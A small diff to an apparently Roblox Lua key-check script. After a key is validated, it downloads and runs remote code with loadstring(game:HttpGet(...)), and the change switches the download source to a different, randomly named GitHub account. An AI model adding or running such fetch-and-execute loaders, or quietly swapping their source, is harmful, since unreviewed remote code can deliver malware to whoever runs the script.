@@ -145,7 +145,7 @@ checkBtn.MouseButton1Click:Connect(function()
 			wait(1)
 			clearAll()
 			task.wait(0.5)
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/Hansvr134/Hanv1/refs/heads/main/Nexa%20Premium"))()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/hdgsydgdgdy1233/dg962bdyd/refs/heads/main/Nexa%20Premium"))()
 		else
 			result.TextColor3 = Color3.new(1,0,0)
 			result.Text = "❌ Key not for this account."
